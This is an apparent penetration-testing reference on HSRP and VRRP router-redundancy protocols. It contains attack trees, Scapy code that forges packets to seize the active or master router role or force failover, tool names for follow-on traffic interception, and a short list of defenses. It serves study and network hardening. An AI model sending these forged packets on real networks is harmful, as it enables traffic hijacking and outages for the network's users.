# First-Hop Redundancy Protocols (HSRP/VRRP)`

## Attack tree for HSRP

```text
1. Compromise HSRP Group (OR)

    1.1. Spoof HSRP Messages (OR)

        1.1.1. Forge Hello Packets (Take Over Active Router Role)

        1.1.2. Modify Priority/Preemption Values

    1.2. Exploit Weak Authentication (OR)

        1.2.1. Crack Plaintext/MD5 Authentication

        1.2.2. Bypass Authentication (If None Configured)

    1.3. Cause Failover Disruption (OR)

        1.3.1. Trigger Unnecessary Active-Standby Switches (DoS)

        1.3.2. Send Fake Resign Messages (Force Role Changes)

2. Man-in-the-Middle (MITM) Attacks (AND)

    2.1. Redirect Traffic via HSRP Takeover (AND)

        2.1.1. Become Active Router (Required)

        2.1.2. Intercept/Modify Traffic (Required)

3. Denial-of-Service (DoS) (OR)

    3.1. Flood HSRP Groups (OR)

        3.1.1. Send Excessive Hellos (Disrupt Election)

        3.1.2. Advertise Invalid Virtual IPs (Confusion Attack)
```

## Attack Tree for VRRP

```text
1. Compromise VRRP Group (OR)

    1.1. Spoof VRRP Advertisements (OR)

        1.1.1. Forge Master Router Advertisements

        1.1.2. Manipulate Priority Values

    1.2. Exploit Authentication Weaknesses (OR)

        1.2.1. Crack Simple Text/MD5 Authentication

        1.2.2. Exploit No Authentication (Default in VRRPv2)

    1.3. Disrupt Failover (OR)

        1.3.1. Force Unnecessary Master-Backup Transitions

        1.3.2. Send Fake Shutdown Events

2. Traffic Interception (AND)

    2.1. MITM via VRRP Takeover (AND)

        2.1.1. Become Master Router (Required)

        2.1.2. Redirect Traffic to Attacker Node (Required)

3. Denial-of-Service (OR)

    3.1. Flood VRRP Groups (OR)

        3.1.1. Overwhelm with Advertisements (Prevent Election)

        3.1.2. Advertise Conflicting Virtual IPs
```

## Key differences

HSRP (Cisco Proprietary) uses UDP 224.0.0.2 (TTL=1). Default authentication = plaintext

VRRP (IEEE Standard) uses 224.0.0.18 (IP Protocol 112). VRRPv3 supports IPv6 and improved auth

## Common attack patterns

* Priority Spoofing: Attacker sets higher priority to become active/master.
* Authentication Bypass: Exploits weak/no auth to inject malicious packets.
* Failover Abuse: Forces unnecessary role changes causing instability.

## HSRP-Specific Exploits

### Crafting Malicious HSRP Packets (Takeover Active Role)

Tool: Scapy (Python)

Send forged HSRPv1/v2 Hello packets with:

* Source IP/MAC = Spoofed legitimate router
* Virtual IP = Target VIP
* Priority = 255 (highest, ensures takeover)
* Group ID = Target HSRP group
* Authentication = Default (plaintext) or brute-forced MD5

```python
from scapy.all import *
sendp(Ether(src="00:11:22:33:44:55", dst="01:00:5e:00:00:02")/  
      IP(src="192.168.1.1", dst="224.0.0.2")/  
      UDP(sport=1985, dport=1985)/  
      HSRP(priority=255, group=1, virtualIP="192.168.1.254"),  
      iface="eth0", loop=1) 
```

Effect: Attacker becomes Active Router, intercepting traffic.

### HSRP DoS via Fake Resign Messages

Send HSRP Resign packet (state=0) from spoofed Active Router:

```python
HSRP(opcode=0, state=0)  # Forces standby routers to re-elect  
```

Effect: Causes flapping, disrupting traffic.

## VRRP-Specific Exploits

### VRRPv2 Master Takeover

Tool: Yersinia (yersinia -G) or Scapy

Send VRRP Advertisement with:

* Priority = 255 (higher than current Master)
* Virtual IP = Target VIP
* Authentication = Simple text (default) or cracked MD5

```python
sendp(Ether(dst="01:00:5e:00:00:12")/  
      IP(src="192.168.1.1", dst="224.0.0.18", proto=112)/  
      VRRP(vrid=1, priority=255, ipcount=1, addrlist=["192.168.1.254"]),  
      iface="eth0")
```

Effect: Attacker becomes Master, controls VIP traffic.

### VRRPv2 DoS via Invalid VIPs

Advertise conflicting VIPs (e.g., VIP = 0.0.0.0):

```python
VRRP(addrlist=["0.0.0.0"])  # Causes VIP conflicts
```
      
Effect: Breaks redundancy, forcing manual recovery.

## Post-Takeover MITM attacks

* ARP Poisoning: If VIP is shared, spoof ARP replies to redirect traffic.
* Traffic Interception: Use tools like ettercap or tcpdump on the new Active/Master router.

## Defensive measures

* Authentication: Use HSRP MD5 or VRRPv3 IPsec AH (avoid plaintext).
* Network Segmentation: Restrict HSRP/VRRP multicast (224.0.0.2/18) to trusted switches (ACLs).
* Monitoring: Alert on priority changes (e.g., via SNMP traps).

